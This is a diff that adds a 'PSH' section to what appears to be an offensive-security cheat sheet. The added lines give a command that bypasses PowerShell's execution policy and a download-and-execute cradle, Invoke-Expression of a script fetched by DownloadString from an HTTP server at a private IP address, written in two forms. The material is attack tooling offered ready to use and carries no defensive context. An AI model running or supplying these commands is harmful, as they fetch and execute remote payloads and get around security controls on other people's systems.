@@ -76,3 +76,13 @@ End Sub
 ```
 
 # PSH
+- Run Powershell scripts bypassing the execution policy
+```powershell
+powershell.exe -ep bypass File script.ps1
+```
+- Run Powershell payload after downloading script from internet
+```powershell
+Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:8888/test.ps1')
+# OR
+powershell -c "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:8888/test.ps1')"
+```
